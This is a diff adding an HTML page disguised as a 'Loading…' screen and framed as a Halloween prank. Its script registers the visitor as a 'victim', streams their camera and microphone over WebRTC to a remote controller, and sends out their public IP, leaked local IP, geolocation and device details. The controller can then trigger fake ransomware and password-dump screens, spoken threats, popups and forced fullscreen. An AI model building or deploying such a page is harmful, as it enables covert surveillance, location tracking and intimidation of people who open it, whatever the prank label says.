@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading…</title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+        }
+        #mirror {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            border: 6px solid #ff0000;
+            z-index: 1;
+            display: none;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 10;
+        }
+        .message {
+            position: absolute;
+            font-size: 4rem;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 0 0 20px #ff0000;
+            white-space: nowrap;
+            animation: floatMsg 8s linear forwards;
+            pointer-events: none;
+        }
+        @keyframes floatMsg {
+            0% { opacity: 1; transform: translateY(0) scale(1); }
+            100% { opacity: 0; transform: translateY(-200px) scale(2); }
+        }
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 5;
+            display: none;
+            pointer-events: none;
+        }
+        #countdownOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            flex-direction: column;
+        }
+        #countdownOverlay.show {
+            display: flex;
+        }
+        #countdownText {
+            font-size: 8rem;
+            color: #ff0000;
+            text-shadow: 0 0 30px #ff0000;
+            animation: pulse 0.5s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.2); }
+        }
+        #ransomScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #111;
+            color: #ff0000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 30;
+            flex-direction: column;
+            font-size: 2rem;
+            text-align: center;
+        }
+        #ransomScreen.show {
+            display: flex;
+        }
+        #ransomScreen h1 {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+        #ransomScreen .btc {
+            color: #f7931a;
+        }
+        #revealBtn {
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 40;
+            padding: 15px 40px;
+            background: #00ff00;
+            color: #000;
+            border: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 10px;
+            display: none;
+            box-shadow: 0 0 30px #00ff00;
+        }
+        #revealBtn:hover {
+            background: #00cc00;
+        }
+        .info-box {
+            position: fixed;
+            bottom: 100px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            padding: 15px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            font-size: 0.8rem;
+            z-index: 15;
+            max-width: 300px;
+            pointer-events: none;
+        }
+        .info-box span { color: #fff; }
+        #roomCodeDisplay {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            padding: 10px 20px;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            font-size: 1.5rem;
+            z-index: 50;
+            pointer-events: none;
+        }
+        #fakePasswords {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.9);
+            color: #ff0;
+            padding: 30px;
+            border: 2px solid #ff0;
+            border-radius: 10px;
+            z-index: 25;
+            display: none;
+            max-width: 600px;
+            font-size: 0.9rem;
+            pointer-events: none;
+        }
+        #fakePasswords.show { display: block; }
+        #fakePasswords pre {
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="mirror" autoplay playsinline muted></video>
+    <canvas id="matrixCanvas"></canvas>
+    <div id="overlay"></div>
+    <div id="countdownOverlay">
+        <div id="countdownText">10</div>
+        <div style="color:#fff; font-size:1.5rem; margin-top:20px;">SYSTEM LOCKED</div>
+    </div>
+    <div id="ransomScreen">
+        <h1>💀 SYSTEM BRICKED</h1>
+        <p>Your files have been encrypted.</p>
+        <p>Pay <span class="btc">0.5 BTC</span> to restore access.</p>
+        <p style="font-size:1rem; margin-top:30px;">Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
+        <p style="font-size:0.8rem; color:#888;">Time remaining: <span id="ransomTimer">60</span>s</p>
+    </div>
+    <div id="roomCodeDisplay">Room: <span id="roomCode">------</span></div>
+    <div class="info-box" id="infoBox">
+        <div>🌐 Public IP: <span id="pubIP">...</span></div>
+        <div>🏠 Local IP: <span id="localIP">...</span></div>
+        <div>📡 WiFi: <span id="wifiName">[fake]</span></div>
+        <div>📍 Location: <span id="location">...</span></div>
+        <div>💻 Device: <span id="deviceInfo">...</span></div>
+    </div>
+    <div id="fakePasswords">
+        <h3 style="color:#ff0000;">🔓 PASSWORDS DUMPED</h3>
+        <pre id="passwordDump"></pre>
+    </div>
+    <button id="revealBtn">🎃 Just a Prank! 😂</button>
+
+    <script>
+        // ============================================================
+        // CONFIG
+        // ============================================================
+        const WS_URL = `wss://${window.location.host}`;
+
+        let roomId = '';
+        let ws = null;
+        let peerConnection = null;
+        let localStream = null;
+        let isControllerConnected = false;
+        let countdownInterval = null;
+        let ransomTimerInterval = null;
+        let revealShown = false;
+
+        // ============================================================
+        // 1. GENERATE ROOM & CONNECT WEBSOCKET
+        // ============================================================
+        function generateRoom() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        roomId = generateRoom();
+        document.getElementById('roomCode').textContent = roomId;
+
+        function connectWebSocket() {
+            ws = new WebSocket(WS_URL);
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ type: 'join', room: roomId, role: 'victim' }));
+            };
+            ws.onmessage = (e) => {
+                const data = JSON.parse(e.data);
+                switch (data.type) {
+                    case 'joined':
+                        console.log('Joined room as victim');
+                        startCamera();
+                        break;
+                    case 'webrtc_offer':
+                        break;
+                    case 'webrtc_answer':
+                        handleAnswer(data.answer);
+                        break;
+                    case 'webrtc_ice':
+                        handleIceCandidate(data.candidate);
+                        break;
+                    case 'command':
+                        handleCommand(data.payload);
+                        break;
+                    default:
+                        break;
+                }
+            };
+            ws.onclose = () => {
+                setTimeout(connectWebSocket, 3000);
+            };
+        }
+
+        // ============================================================
+        // 2. CAMERA & MIC (with local mirror)
+        // ============================================================
+        async function startCamera() {
+            try {
+                const constraints = { video: true, audio: true };
+                localStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('mirror');
+                video.srcObject = localStream;
+                video.style.display = 'block';
+
+                createPeerConnection();
+                localStream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, localStream);
+                });
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                ws.send(JSON.stringify({ type: 'webrtc_offer', room: roomId, offer: offer }));
+            } catch (err) {
+                console.error('Camera/mic error:', err);
+                createPeerConnection();
+            }
+        }
+
+        // ============================================================
+        // 3. WEBRTC PEER CONNECTION (to send video/audio to controller)
+        // ============================================================
+        function createPeerConnection() {
+            const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+            peerConnection = new RTCPeerConnection(config);
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    ws.send(JSON.stringify({
+                        type: 'webrtc_ice',
+                        room: roomId,
+                        candidate: event.candidate
+                    }));
+                }
+            };
+            peerConnection.oniceconnectionstatechange = () => {
+                if (peerConnection.iceConnectionState === 'connected') {
+                    isControllerConnected = true;
+                }
+            };
+        }
+
+        function handleAnswer(answer) {
+            if (peerConnection) {
+                peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+            }
+        }
+
+        function handleIceCandidate(candidate) {
+            if (peerConnection) {
+                peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
+            }
+        }
+
+        // ============================================================
+        // 4. EXTRACT DATA & SEND TO CONTROLLER
+        // ============================================================
+        async function collectAndSendInfo() {
+            const info = {};
+
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                info.publicIP = data.ip;
+                document.getElementById('pubIP').textContent = data.ip;
+            } catch (e) { info.publicIP = 'Unknown'; }
+
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('dummy');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                const sdp = pc.localDescription.sdp;
+                const lines = sdp.split('\n');
+                let localIP = 'Unknown';
+                for (let line of lines) {
+                    if (line.includes('candidate')) {
+                        const parts = line.split(' ');
+                        if (parts.length >= 5) {
+                            const ip = parts[4];
+                            if (ip && ip.includes('.')) {
+                                localIP = ip;
+                                break;
+                            }
+                        }
+                    }
+                }
+                info.localIP = localIP;
+                document.getElementById('localIP').textContent = localIP;
+                pc.close();
+            } catch (e) { info.localIP = 'Unknown'; }
+
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                const { latitude, longitude } = pos.coords;
+                info.location = `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
+                document.getElementById('location').textContent = info.location;
+            } catch (e) { info.location = 'Permission denied'; }
+
+            const ua = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const os = navigator.platform;
+            info.device = `${os} | ${screenRes} | ${ua}`;
+            document.getElementById('deviceInfo').textContent = info.device;
+
+            const fakeWiFi = ['HomeWiFi-5G', 'Starbucks_WiFi', 'Neighbor_Network', 'School_Student', 'Campus_Net'].sort(() => Math.random() - 0.5)[0];
+            info.wifi = fakeWiFi;
+            document.getElementById('wifiName').textContent = fakeWiFi;
+
+            const passwords = {
+                'Facebook': 'h@ck3d_123',
+                'Gmail': 'p@ssw0rd!',
+                'PayPal': 'secure_456',
+                'Instagram': 'insta_l0ve',
+                'Netflix': 'stream_me'
+            };
+            const dump = Object.entries(passwords).map(([k, v]) => `${k}: ${v}`).join('\n');
+            document.getElementById('passwordDump').textContent = dump;
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'info', room: roomId, data: info }));
+            }
+        }
+
+        // ============================================================
+        // 5. COMMAND HANDLER (what controller sends)
+        // ============================================================
+        function handleCommand(payload) {
+            const { action, value } = payload;
+            switch (action) {
+                case 'message':
+                    showFloatingMessage(value);
+                    break;
+                case 'matrix':
+                    startMatrix();
+                    break;
+                case 'countdown':
+                    startCountdown();
+                    break;
+                case 'beep':
+                    playBeep();
+                    break;
+                case 'speech':
+                    speakText(value || 'I am inside your network. Do not move.');
+                    break;
+                case 'popup':
+                    openPopups();
+                    break;
+                case 'passwords':
+                    document.getElementById('fakePasswords').classList.add('show');
+                    setTimeout(() => document.getElementById('fakePasswords').classList.remove('show'), 8000);
+                    break;
+                case 'ransom':
+                    showRansom();
+                    break;
+                case 'release':
+                    releasePrank();
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        // ============================================================
+        // 6. FEAR FACTORY – all the scary effects
+        // ============================================================
+
+        function showFloatingMessage(text) {
+            const overlay = document.getElementById('overlay');
+            const msg = document.createElement('div');
+            msg.className = 'message';
+            msg.textContent = text || '⚠️ YOU ARE BEING WATCHED ⚠️';
+            msg.style.left = (10 + Math.random() * 70) + '%';
+            msg.style.top = (10 + Math.random() * 70) + '%';
+            msg.style.fontSize = (3 + Math.random() * 4) + 'rem';
+            overlay.appendChild(msg);
+            setTimeout(() => msg.remove(), 9000);
+        }
+
+        function startMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            canvas.style.display = 'block';
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            const cols = Math.floor(canvas.width / 20);
+            const drops = Array(cols).fill(1);
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            let frameId;
+
+            function draw() {
+                ctx.fillStyle = 'rgba(0,0,0,0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#0f0';
+                ctx.font = '20px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                    ctx.fillText(text, i * 20, drops[i] * 20);
+                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+                frameId = requestAnimationFrame(draw);
+            }
+            draw();
+            setTimeout(() => {
+                cancelAnimationFrame(frameId);
+                canvas.style.display = 'none';
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+            }, 10000);
+        }
+
+        function startCountdown() {
+            const overlay = document.getElementById('countdownOverlay');
+            overlay.classList.add('show');
+            let count = 10;
+            const textEl = document.getElementById('countdownText');
+            textEl.textContent = count;
+            clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                count--;
+                if (count <= 0) {
+                    clearInterval(countdownInterval);
+                    overlay.classList.remove('show');
+                    showRansom();
+                } else {
+                    textEl.textContent = count;
+                }
+            }, 1000);
+        }
+
+        function showRansom() {
+            const screen = document.getElementById('ransomScreen');
+            screen.classList.add('show');
+            let time = 60;
+            const timerEl = document.getElementById('ransomTimer');
+            timerEl.textContent = time;
+            clearInterval(ransomTimerInterval);
+            ransomTimerInterval = setInterval(() => {
+                time--;
+                timerEl.textContent = time;
+                if (time <= 0) {
+                    clearInterval(ransomTimerInterval);
+                }
+            }, 1000);
+            setTimeout(() => {
+                if (!revealShown) {
+                    releasePrank();
+                }
+            }, 30000);
+        }
+
+        function playBeep() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.frequency.value = 800;
+                oscillator.type = 'square';
+                gainNode.gain.value = 0.3;
+                oscillator.start();
+                setTimeout(() => {
+                    oscillator.stop();
+                    audioCtx.close();
+                }, 500);
+            } catch (e) { }
+            setTimeout(() => {
+                try {
+                    const audioCtx2 = new (window.AudioContext || window.webkitAudioContext)();
+                    const osc2 = audioCtx2.createOscillator();
+                    const gain2 = audioCtx2.createGain();
+                    osc2.connect(gain2);
+                    gain2.connect(audioCtx2.destination);
+                    osc2.frequency.value = 1200;
+                    osc2.type = 'sawtooth';
+                    gain2.gain.value = 0.2;
+                    osc2.start();
+                    setTimeout(() => {
+                        osc2.stop();
+                        audioCtx2.close();
+                    }, 300);
+                } catch (e) {}
+            }, 1000);
+        }
+
+        function speakText(text) {
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.rate = 1.2;
+                utterance.pitch = 0.8;
+                utterance.volume = 1;
+                window.speechSynthesis.speak(utterance);
+            }
+        }
+
+        function openPopups() {
+            const urls = [
+                'https://example.com/you-have-been-hacked',
+                'https://example.com/your-data-is-leaked',
+                'https://example.com/contact-support'
+            ];
+            urls.forEach((url) => {
+                window.open(url, '_blank', 'noopener,noreferrer');
+            });
+        }
+
+        function releasePrank() {
+            revealShown = true;
+            document.getElementById('countdownOverlay').classList.remove('show');
+            document.getElementById('ransomScreen').classList.remove('show');
+            document.getElementById('matrixCanvas').style.display = 'none';
+            document.getElementById('fakePasswords').classList.remove('show');
+            document.getElementById('revealBtn').style.display = 'block';
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+            }
+            showFloatingMessage('🎃 Just a Prank! Happy Halloween! 🎃');
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+            }
+            if (document.pointerLockElement) {
+                document.exitPointerLock();
+            }
+        }
+
+        // ============================================================
+        // 7. INIT
+        // ============================================================
+        connectWebSocket();
+        collectAndSendInfo();
+
+        document.addEventListener('click', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+            if (!document.pointerLockElement) {
+                document.documentElement.requestPointerLock().catch(() => {});
+            }
+        });
+
+        setTimeout(() => {
+            if (!revealShown) {
+                releasePrank();
+            }
+        }, 30000);
+
+        document.getElementById('revealBtn').addEventListener('click', releasePrank);
+
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement && !revealShown) {
+            }
+        });
+
+        console.log('💀 OMNISCIENT active. Room:', roomId);
+    </script>
+</body>
+</html>
